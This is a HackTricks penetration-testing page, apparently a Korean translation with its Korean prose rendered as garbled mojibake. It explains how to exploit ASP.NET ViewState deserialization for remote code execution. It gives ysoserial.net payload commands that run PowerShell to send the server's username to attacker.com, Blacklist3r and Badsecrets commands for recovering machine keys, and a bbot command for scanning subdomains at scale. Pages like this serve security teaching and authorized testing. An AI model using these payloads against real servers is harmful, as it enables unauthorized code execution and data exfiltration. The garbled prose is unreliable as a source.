# Exploiting \_\_VIEWSTATE without knowing the secrets

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## What is ViewState

**ViewState**ëŠ” ASP.NETì—ì„œ ì›¹ í˜ì´ì§€ ê°„ì— í˜ì´ì§€ ë° ì»¨íŠ¸ë¡¤ ë°ì´í„°ë¥¼ ìœ ì§€í•˜ê¸° ìœ„í•œ ê¸°ë³¸ ë©”ì»¤ë‹ˆì¦˜ìœ¼ë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤. í˜ì´ì§€ì˜ HTMLì´ ë Œë”ë§ë˜ëŠ” ë™ì•ˆ, í˜ì´ì§€ì˜ í˜„ì¬ ìƒíƒœì™€ í¬ìŠ¤íŠ¸ë°± ì¤‘ì— ë³´ì¡´ë  ê°’ë“¤ì´ base64ë¡œ ì¸ì½”ë”©ëœ ë¬¸ìì—´ë¡œ ì§ë ¬í™”ë©ë‹ˆë‹¤. ì´ëŸ¬í•œ ë¬¸ìì—´ì€ ìˆ¨ê²¨ì§„ ViewState í•„ë“œì— ë°°ì¹˜ë©ë‹ˆë‹¤.

ViewState ì •ë³´ëŠ” ë‹¤ìŒ ì†ì„± ë˜ëŠ” ê·¸ ì¡°í•©ìœ¼ë¡œ íŠ¹ì§•ì§€ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* **Base64**:
* ì´ í˜•ì‹ì€ `EnableViewStateMac` ë° `ViewStateEncryptionMode` ì†ì„±ì´ ëª¨ë‘ falseë¡œ ì„¤ì •ë  ë•Œ ì‚¬ìš©ë©ë‹ˆë‹¤.
* **Base64 + MAC (ë©”ì‹œì§€ ì¸ì¦ ì½”ë“œ) í™œì„±í™”**:
* MACì˜ í™œì„±í™”ëŠ” `EnableViewStateMac` ì†ì„±ì„ trueë¡œ ì„¤ì •í•˜ì—¬ ì´ë£¨ì–´ì§‘ë‹ˆë‹¤. ì´ëŠ” ViewState ë°ì´í„°ì— ëŒ€í•œ ë¬´ê²°ì„± ê²€ì¦ì„ ì œê³µí•©ë‹ˆë‹¤.
* **Base64 + ì•”í˜¸í™”**:
* ì•”í˜¸í™”ëŠ” `ViewStateEncryptionMode` ì†ì„±ì´ trueë¡œ ì„¤ì •ë  ë•Œ ì ìš©ë˜ì–´ ViewState ë°ì´í„°ì˜ ê¸°ë°€ì„±ì„ ë³´ì¥í•©ë‹ˆë‹¤.

## Test Cases

ì´ë¯¸ì§€ëŠ” .NET í”„ë ˆì„ì›Œí¬ ë²„ì „ì— ë”°ë¼ ASP.NETì—ì„œ ViewStateì˜ ë‹¤ì–‘í•œ êµ¬ì„±ì— ëŒ€í•œ í‘œë¥¼ ìì„¸íˆ ì„¤ëª…í•©ë‹ˆë‹¤. ë‚´ìš© ìš”ì•½ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

1. **ëª¨ë“  ë²„ì „ì˜ .NET**ì— ëŒ€í•´, MACê³¼ ì•”í˜¸í™”ê°€ ëª¨ë‘ ë¹„í™œì„±í™”ëœ ê²½ìš°, MachineKeyê°€ í•„ìš”í•˜ì§€ ì•Šìœ¼ë©°, ë”°ë¼ì„œ ì´ë¥¼ ì‹ë³„í•  ìˆ˜ ìˆëŠ” ë°©ë²•ì´ ì—†ìŠµë‹ˆë‹¤.
2. **4.5 ë¯¸ë§Œì˜ ë²„ì „**ì— ëŒ€í•´, MACì´ í™œì„±í™”ë˜ì—ˆì§€ë§Œ ì•”í˜¸í™”ê°€ ë¹„í™œì„±í™”ëœ ê²½ìš°, MachineKeyê°€ í•„ìš”í•©ë‹ˆë‹¤. MachineKeyë¥¼ ì‹ë³„í•˜ëŠ” ë°©ë²•ì€ "Blacklist3r"ë¡œ ì–¸ê¸‰ë©ë‹ˆë‹¤.
3. **4.5 ë¯¸ë§Œì˜ ë²„ì „**ì— ëŒ€í•´, MACì´ í™œì„±í™”ë˜ì—ˆë“  ë¹„í™œì„±í™”ë˜ì—ˆë“ , ì•”í˜¸í™”ê°€ í™œì„±í™”ëœ ê²½ìš°, MachineKeyê°€ í•„ìš”í•©ë‹ˆë‹¤. MachineKeyë¥¼ ì‹ë³„í•˜ëŠ” ê²ƒì€ "Blacklist3r - Future Development"ì˜ ì‘ì—…ì…ë‹ˆë‹¤.
4. **4.5 ì´ìƒì˜ ë²„ì „**ì— ëŒ€í•´, MACê³¼ ì•”í˜¸í™”ì˜ ëª¨ë“  ì¡°í•©(ë‘˜ ë‹¤ trueì´ê±°ë‚˜ í•˜ë‚˜ëŠ” trueì´ê³  ë‹¤ë¥¸ í•˜ë‚˜ëŠ” falseì¸ ê²½ìš°)ì€ MachineKeyë¥¼ í•„ìš”ë¡œ í•©ë‹ˆë‹¤. MachineKeyëŠ” "Blacklist3r"ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‹ë³„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Test Case: 1 â€“ EnableViewStateMac=false and viewStateEncryptionMode=false

`AspNetEnforceViewStateMac` ë ˆì§€ìŠ¤íŠ¸ë¦¬ í‚¤ë¥¼ 0ìœ¼ë¡œ ì„¤ì •í•˜ì—¬ ViewStateMACë¥¼ ì™„ì „íˆ ë¹„í™œì„±í™”í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
**ViewState ì†ì„± ì‹ë³„í•˜ê¸°**

BurpSuiteë¥¼ ì‚¬ìš©í•˜ì—¬ ì´ ë§¤ê°œë³€ìˆ˜ë¥¼ í¬í•¨í•˜ëŠ” ìš”ì²­ì„ ìº¡ì²˜í•˜ì—¬ ViewStateê°€ MACìœ¼ë¡œ ë³´í˜¸ë˜ëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë§¤ê°œë³€ìˆ˜ë¥¼ ë³´í˜¸í•˜ëŠ” ë° Macì´ ì‚¬ìš©ë˜ì§€ ì•ŠëŠ” ê²½ìš° [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)ì„ ì‚¬ìš©í•˜ì—¬ ì´ë¥¼ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```
### Test case 1.5 â€“ Test case 1ê³¼ ê°™ì§€ë§Œ ViewState ì¿ í‚¤ê°€ ì„œë²„ì—ì„œ ì „ì†¡ë˜ì§€ ì•ŠìŒ

ê°œë°œìëŠ” **ViewState**ê°€ HTTP ìš”ì²­ì˜ ì¼ë¶€ê°€ ë˜ì§€ ì•Šë„ë¡ **ì œê±°**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ì‚¬ìš©ìëŠ” ì´ ì¿ í‚¤ë¥¼ ë°›ì§€ ì•ŠìŒ).\
**ViewState**ê°€ **ì¡´ì¬í•˜ì§€ ì•Šìœ¼ë©´**, ê·¸ë“¤ì˜ êµ¬í˜„ì´ **ViewState ì—­ì§ë ¬í™”**ì™€ ê´€ë ¨ëœ ì ì¬ì  ì·¨ì•½ì ìœ¼ë¡œë¶€í„° **ì•ˆì „í•˜ë‹¤**ê³  ê°€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
í•˜ì§€ë§Œ, ê·¸ë ‡ì§€ ì•ŠìŠµë‹ˆë‹¤. ìš”ì²­ ë³¸ë¬¸ì— **ViewState ë§¤ê°œë³€ìˆ˜**ë¥¼ ì¶”ê°€í•˜ê³  ysoserialì„ ì‚¬ìš©í•˜ì—¬ ìƒì„±í•œ ì§ë ¬í™”ëœ í˜ì´ë¡œë“œë¥¼ ì „ì†¡í•˜ë©´, ì—¬ì „íˆ **ì½”ë“œ ì‹¤í–‰**ì„ ë‹¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” **Case 1**ì—ì„œ ë³´ì—¬ì¤ë‹ˆë‹¤.

### Test Case: 2 â€“ .Net < 4.5 ë° EnableViewStateMac=true & ViewStateEncryptionMode=false

íŠ¹ì • í˜ì´ì§€ì— ëŒ€í•´ **ViewState MAC**ì„ **í™œì„±í™”**í•˜ë ¤ë©´ íŠ¹ì • aspx íŒŒì¼ì—ì„œ ë‹¤ìŒê³¼ ê°™ì€ ë³€ê²½ì„ í•´ì•¼ í•©ë‹ˆë‹¤:
```bash
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%>
```
ìš°ë¦¬ëŠ” ì•„ë˜ì™€ ê°™ì´ **web.config** íŒŒì¼ì— ì„¤ì •í•˜ì—¬ **ì „ì²´** ì• í”Œë¦¬ì¼€ì´ì…˜ì— ëŒ€í•´ì„œë„ ì´ë¥¼ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<customErrors mode="Off" />
<machineKey validation="SHA1" validationKey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" />
<pages enableViewStateMac="true" />
</system.web>
</configuration>
```
ë§¤ê°œë³€ìˆ˜ê°€ MACìœ¼ë¡œ ë³´í˜¸ë˜ê¸° ë•Œë¬¸ì— ê³µê²©ì„ ì„±ê³µì ìœ¼ë¡œ ì‹¤í–‰í•˜ë ¤ë©´ ë¨¼ì € ì‚¬ìš©ëœ í‚¤ê°€ í•„ìš”í•©ë‹ˆë‹¤.

ì‚¬ìš©ëœ í‚¤ë¥¼ ì°¾ê¸° ìœ„í•´ [**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper)ë¥¼ ì‚¬ìš©í•´ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"

--encrypteddata : __VIEWSTATE parameter value of the target application
--modifier : __VIWESTATEGENERATOR parameter value
```
[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets)ëŠ” ì•Œë ¤ì§„ machineKeysë¥¼ ì‹ë³„í•  ìˆ˜ ìˆëŠ” ë˜ ë‹¤ë¥¸ ë„êµ¬ì…ë‹ˆë‹¤. Pythonìœ¼ë¡œ ì‘ì„±ë˜ì—ˆê¸° ë•Œë¬¸ì— Blacklist3rì™€ ë‹¬ë¦¬ Windows ì˜ì¡´ì„±ì´ ì—†ìŠµë‹ˆë‹¤. .NET viewstateì˜ ê²½ìš° "python blacklist3r" ìœ í‹¸ë¦¬í‹°ê°€ ìˆìœ¼ë©°, ì´ëŠ” ê°€ì¥ ë¹ ë¥¸ ì‚¬ìš© ë°©ë²•ì…ë‹ˆë‹¤.

viewstateì™€ generatorë¥¼ ì§ì ‘ ì œê³µí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
```
![https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png](https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png)

ë˜ëŠ”, ëŒ€ìƒ URLì— ì§ì ‘ ì—°ê²°í•˜ì—¬ HTMLì—ì„œ viewstateë¥¼ ì¶”ì¶œí•˜ë ¤ê³  ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
```
![https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png](https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png)

ì·¨ì•½í•œ viewstateë¥¼ ëŒ€ê·œëª¨ë¡œ ê²€ìƒ‰í•˜ê¸° ìœ„í•´, ì„œë¸Œë„ë©”ì¸ ì—´ê±°ì™€ í•¨ê»˜ `badsecrets` [**BBOT**](exploiting-\_\_viewstate-parameter.md) ëª¨ë“ˆì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
![https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png](https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png)

ìš´ì´ ì¢‹ë‹¤ë©´ í‚¤ë¥¼ ì°¾ì„ ìˆ˜ ìˆìœ¼ë©°, [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)**:**ë¥¼ ì‚¬ìš©í•˜ì—¬ ê³µê²©ì„ ì§„í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

--generator = {__VIWESTATEGENERATOR parameter value}
```
ì„œë²„ì—ì„œ `_VIEWSTATEGENERATOR` ë§¤ê°œë³€ìˆ˜ê°€ **ì „ì†¡ë˜ì§€ ì•ŠëŠ”** ê²½ìš° `--generator` ë§¤ê°œë³€ìˆ˜ë¥¼ **ì œê³µí•  í•„ìš”ê°€ ì—†ì§€ë§Œ** ë‹¤ìŒ ë§¤ê°œë³€ìˆ˜ëŠ” **ì œê³µí•´ì•¼ í•©ë‹ˆë‹¤**:
```bash
--apppath="/" --path="/hello.aspx"
```
### Test Case: 3 â€“ .Net < 4.5 and EnableViewStateMac=true/false and ViewStateEncryptionMode=true

ì´ ê²½ìš° ë§¤ê°œë³€ìˆ˜ê°€ MACìœ¼ë¡œ ë³´í˜¸ë˜ëŠ”ì§€ ì—¬ë¶€ëŠ” ì•Œë ¤ì ¸ ìˆì§€ ì•ŠìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ê°’ì€ ì•„ë§ˆë„ ì•”í˜¸í™”ë˜ì–´ ìˆìœ¼ë©°, ì·¨ì•½ì ì„ ì•…ìš©í•˜ê¸° ìœ„í•´ **í˜ì´ë¡œë“œë¥¼ ì•”í˜¸í™”í•  Machine Keyê°€ í•„ìš”í•©ë‹ˆë‹¤**.

**ì´ ê²½ìš°** [**Blacklist3r**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) **ëª¨ë“ˆì´ ê°œë°œ ì¤‘ì…ë‹ˆë‹¤...**

**.NET 4.5 ì´ì „ì—**, ASP.NETì€ **`ViewStateEncryptionMode`**ê°€ _**í•­ìƒ**_ìœ¼ë¡œ ì„¤ì •ë˜ì–´ ìˆë”ë¼ë„ ì‚¬ìš©ìë¡œë¶€í„° **ì•”í˜¸í™”ë˜ì§€ ì•Šì€** \_`__VIEWSTATE`\_ ë§¤ê°œë³€ìˆ˜ë¥¼ **ë°›ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ASP.NETì€ ìš”ì²­ì—ì„œ **`__VIEWSTATEENCRYPTED`** ë§¤ê°œë³€ìˆ˜ì˜ **ì¡´ì¬**ë§Œì„ **í™•ì¸í•©ë‹ˆë‹¤**. **ì´ ë§¤ê°œë³€ìˆ˜ë¥¼ ì œê±°í•˜ê³  ì•”í˜¸í™”ë˜ì§€ ì•Šì€ í˜ì´ë¡œë“œë¥¼ ì „ì†¡í•˜ë©´ ì—¬ì „íˆ ì²˜ë¦¬ë©ë‹ˆë‹¤.**

ë”°ë¼ì„œ ê³µê²©ìê°€ íŒŒì¼ íƒìƒ‰ê³¼ ê°™ì€ ë‹¤ë¥¸ ì·¨ì•½ì ì„ í†µí•´ Machinekeyë¥¼ ì–»ëŠ” ë°©ë²•ì„ ì°¾ìœ¼ë©´, **Case 2**ì—ì„œ ì‚¬ìš©ëœ [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ ViewState ì—­ì§ë ¬í™” ì·¨ì•½ì ì„ ì´ìš©í•œ RCEë¥¼ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

* ViewState ì—­ì§ë ¬í™” ì·¨ì•½ì ì„ ì•…ìš©í•˜ê¸° ìœ„í•´ ìš”ì²­ì—ì„œ `__VIEWSTATEENCRYPTED` ë§¤ê°œë³€ìˆ˜ë¥¼ ì œê±°í•˜ì‹­ì‹œì˜¤. ê·¸ë ‡ì§€ ì•Šìœ¼ë©´ Viewstate MAC ê²€ì¦ ì˜¤ë¥˜ê°€ ë°˜í™˜ë˜ê³  ì•…ìš©ì´ ì‹¤íŒ¨í•©ë‹ˆë‹¤.

### Test Case: 4 â€“ .Net >= 4.5 and EnableViewStateMac=true/false and ViewStateEncryptionMode=true/false except both attribute to false

ì•„ë˜ì™€ ê°™ì´ web.config íŒŒì¼ ë‚´ì— ì•„ë˜ ë§¤ê°œë³€ìˆ˜ë¥¼ ì§€ì •í•˜ì—¬ ASP.NET í”„ë ˆì„ì›Œí¬ì˜ ì‚¬ìš©ì„ ê°•ì œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```xml
<httpRuntime targetFramework="4.5" />
```
ë˜ëŠ”, ì´ëŠ” web.config íŒŒì¼ì˜ `machineKey` ë§¤ê°œë³€ìˆ˜ ë‚´ì— ì•„ë˜ ì˜µì…˜ì„ ì§€ì •í•˜ì—¬ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
compatibilityMode="Framework45"
```
ì´ì „ê³¼ ë§ˆì°¬ê°€ì§€ë¡œ **ê°’ì´ ì•”í˜¸í™”ë˜ì–´ ìˆìŠµë‹ˆë‹¤.** ê·¸ëŸ¬ë¯€ë¡œ **ìœ íš¨í•œ í˜ì´ë¡œë“œë¥¼ ë³´ë‚´ê¸° ìœ„í•´ ê³µê²©ìëŠ” í‚¤ê°€ í•„ìš”í•©ë‹ˆë‹¤.**

[**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‚¬ìš© ì¤‘ì¸ í‚¤ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

--encrypteddata = {__VIEWSTATE parameter value}
--IISDirPath = {Directory path of website in IIS}
--TargetPagePath = {Target page path in application}
```
IISDirPathì™€ TargetPagePathì— ëŒ€í•œ ë” ìì„¸í•œ ì„¤ëª…ì€ [ì—¬ê¸°ë¥¼ ì°¸ì¡°í•˜ì„¸ìš”](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)

ë˜ëŠ” [**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) (ìƒì„±ê¸° ê°’ í¬í•¨) ì‚¬ìš©:
```bash
cd badsecrets
python examples/blacklist3r.py --viewstate JLFYOOegbdXmPjQou22oT2IxUwCAzSA9EAxD6+305e/4MQG7G1v5GI3wL7D94W2OGpVGrI2LCqEwDoS/8JkE0rR4ak0= --generator B2774415
```
![https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png](https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png)

ìœ íš¨í•œ Machine keyê°€ í™•ì¸ë˜ë©´, **ë‹¤ìŒ ë‹¨ê³„ëŠ”** [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) **ì„ ì‚¬ìš©í•˜ì—¬ ì§ë ¬í™”ëœ í˜ì´ë¡œë“œë¥¼ ìƒì„±í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.**
```
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
```
If you have the value of `__VIEWSTATEGENERATOR` you can try to **use** the `--generator` parameter with that value and **omit** the parameters `--path` and `--apppath`

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.2.png)

ViewState ì—­ì§ë ¬í™” ì·¨ì•½ì ì„ ì„±ê³µì ìœ¼ë¡œ ì•…ìš©í•˜ë©´ ì‚¬ìš©ì ì´ë¦„ì´ í¬í•¨ëœ ê³µê²©ì ì œì–´ ì„œë²„ì— ëŒ€í•œ ë¹„ë™ê¸° ìš”ì²­ì´ ë°œìƒí•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ì¢…ë¥˜ì˜ ìµìŠ¤í”Œë¡œì‡ì€ "Blacklist3r ë° YsoSerial.NETì„ ì‚¬ìš©í•œ ViewState ì—­ì§ë ¬í™” ì•…ìš©"ì´ë¼ëŠ” ì œëª©ì˜ ë¦¬ì†ŒìŠ¤ë¥¼ í†µí•´ ì°¾ì„ ìˆ˜ ìˆëŠ” ê°œë… ì¦ëª…(PoC)ì—ì„œ ì‹œì—°ë©ë‹ˆë‹¤. ì•…ìš© í”„ë¡œì„¸ìŠ¤ê°€ ì–´ë–»ê²Œ ì‘ë™í•˜ëŠ”ì§€ì™€ MachineKey ì‹ë³„ì„ ìœ„í•œ Blacklist3rì™€ ê°™ì€ ë„êµ¬ë¥¼ í™œìš©í•˜ëŠ” ë°©ë²•ì— ëŒ€í•œ ìì„¸í•œ ë‚´ìš©ì€ ì œê³µëœ [ì„±ê³µì ì¸ ì•…ìš©ì˜ PoC](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC)ë¥¼ ê²€í† í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Test Case 6 â€“ ViewStateUserKeys is being used

**ViewStateUserKey** ì†ì„±ì€ **CSRF ê³µê²©**ì— ëŒ€í•´ **ë°©ì–´**í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì• í”Œë¦¬ì¼€ì´ì…˜ì— ê·¸ëŸ¬í•œ í‚¤ê°€ ì •ì˜ë˜ì–´ ìˆê³  ì§€ê¸ˆê¹Œì§€ ë…¼ì˜ëœ ë°©ë²•ìœ¼ë¡œ **ViewState** í˜ì´ë¡œë“œë¥¼ ìƒì„±í•˜ë ¤ê³  í•˜ë©´ **í˜ì´ë¡œë“œëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ì— ì˜í•´ ì²˜ë¦¬ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤**.\
í˜ì´ë¡œë“œë¥¼ ì˜¬ë°”ë¥´ê²Œ ìƒì„±í•˜ë ¤ë©´ í•˜ë‚˜ì˜ ë§¤ê°œë³€ìˆ˜ë¥¼ ë” ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤:
```bash
--viewstateuserkey="randomstringdefinedintheserver"
```
### Result of a Successful Exploitation <a href="#poc" id="poc"></a>

ëª¨ë“  í…ŒìŠ¤íŠ¸ ì¼€ì´ìŠ¤ì—ì„œ ViewState YSoSerial.Net í˜ì´ë¡œë“œê°€ **ì„±ê³µì ìœ¼ë¡œ** ì‘ë™í•˜ë©´ ì„œë²„ëŠ” â€œ**500 Internal server error**â€ì™€ í•¨ê»˜ â€œ**ì´ í˜ì´ì§€ì— ëŒ€í•œ ìƒíƒœ ì •ë³´ê°€ ìœ íš¨í•˜ì§€ ì•Šìœ¼ë©° ì†ìƒë˜ì—ˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**â€ë¼ëŠ” ì‘ë‹µ ë‚´ìš©ì„ ë°˜í™˜í•˜ê³  OOB ìš”ì²­ì„ ë°›ìŠµë‹ˆë‹¤.

[ì—¬ê¸°ì—ì„œ ì¶”ê°€ ì •ë³´ë¥¼ í™•ì¸í•˜ì„¸ìš”](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/deserialization/\[\*\*https:/www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/\*\*]\(https:/www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/\)/README.md)

## References

* [**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
* [**https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817**](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)\\
* [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [**https://blog.blacklanternsecurity.com/p/introducing-badsecrets**](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
